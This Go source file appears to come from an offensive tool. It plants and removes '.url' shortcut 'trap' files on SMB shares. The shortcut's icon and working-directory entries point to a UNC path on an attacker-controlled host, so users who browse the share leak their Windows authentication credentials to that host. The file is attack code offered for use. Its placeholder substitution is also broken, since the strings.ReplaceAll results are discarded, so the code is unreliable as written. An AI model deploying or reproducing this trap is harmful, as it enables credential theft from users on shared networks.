package jump_smb

import (
	"fmt"
	"github.com/LeakIX/go-smb2"
	"github.com/go-playground/validator/v10"
	"log"
	"strings"
)

func ValidateTrap(o *Options) {

	var v *validator.Validate
	v = validator.New()
	err := v.Struct(o)
	if err != nil {
		log.Fatal(err)
	}

	return
}

func WriteTrap(FileShare *smb2.Share, options *Options) error {
	f, err := FileShare.Create(fmt.Sprintf("%s.url", options.TrapFileName))
	if err != nil {
		return err
	}
	defer f.Close()
	_, err = f.Write([]byte(TrapFileContents(options)))
	if err != nil {
		return err
	}
	return nil

}

func DeleteTrap(FileShare *smb2.Share, options *Options) error {
	err := FileShare.Remove(fmt.Sprintf("%s.url", options.TrapFileName))
	if err != nil {
		return err
	}
	return nil
}

func TrapFileContents(options *Options) string {
	filecontents := (`[InternetShortcut]
URL="https://google.com"
WorkingDirectory=\\ATTACKERIP\TRAPNAME
IconFile=\\ATTACKERIP\TRAPNAME.icon
IconIndex=1`)
	strings.ReplaceAll(filecontents, "ATTACKERIP", options.TrapAttackerIP)
	strings.ReplaceAll(filecontents, "TRAPNAME", options.TrapFileName)
	return filecontents
}
